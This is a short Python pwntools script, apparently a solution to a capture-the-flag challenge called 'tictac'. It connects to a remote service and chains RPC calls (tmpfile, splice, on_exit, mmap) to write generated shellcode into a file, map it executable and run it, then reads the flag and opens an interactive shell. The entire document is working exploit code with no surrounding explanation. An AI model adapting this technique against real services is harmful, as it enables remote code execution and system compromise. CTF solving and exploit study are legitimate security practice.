from pwn import *



p = remote("tictac.nc.jctf.pro", 1337)

context(log_level = "debug", arch = "amd64", os = "linux")
shellcode = asm(shellcraft.sh())

def rpc_call(func_name, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0):
    payload = f"tictactoe:{func_name} {a1} {a2} {a3} {a4} {a5} {a6}"
    p.sendline(payload.encode())

rpc_call("tmpfile")

rpc_call("splice", a3=3, a5=len(shellcode))
p.send(shellcode)

rpc_call("on_exit", 0x10000)
rpc_call("mmap", 0x10000, 4096, 7, 1, 3, 0)


p.sendline("./readflag;")
p.interactive()

